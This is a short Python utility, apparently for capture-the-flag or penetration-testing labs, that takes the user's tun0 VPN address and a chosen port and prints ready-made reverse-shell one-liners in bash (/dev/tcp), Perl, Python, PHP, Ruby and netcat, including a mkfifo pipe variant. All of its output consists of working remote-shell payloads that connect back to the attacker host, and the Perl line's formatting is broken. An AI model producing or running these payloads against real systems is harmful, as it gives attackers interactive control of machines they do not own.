#!/usr/bin/env python

import netifaces as ni
import argparse
import sys


def shell(IP,PORT):
    print("\nBASH:")
    print("bash -i >& /dev/tcp/{}/{} 0>&1\n".format(IP,PORT))

    print("\nPERL:")
    print('''perl -e 'use Socket;$i="{{}}";$p={};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'\n'''.format(IP,PORT))

    print("\nPYTHON:")
    print('''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'\n'''.format(IP,PORT))
    
    print("\nPHP:")
    print('''php -r '$sock=fsockopen("{}",{});exec("/bin/sh -i <&3 >&3 2>&3");'\n'''.format(IP,PORT))

    print("\nRUBY:")
    print('''ruby -rsocket -e'f=TCPSocket.open("{}",{}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'\n'''.format(IP,PORT))

    print("\nNETCAT:")
    print("nc -e /bin/sh {} {}".format(IP,PORT))
    print("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f\n".format(IP,PORT))

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-p", "--PORT", required=True, help="Enter the port number")
    argv = parser.parse_args()
    PORT = argv.PORT
    PORT = PORT.strip()
    try:
        IP = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
    except ValueError:
        print("[-] It seems like you are not connected to VPN!")
        sys.exit(-2)
    shell(IP,PORT)

if __name__ == "__main__":
    main()
    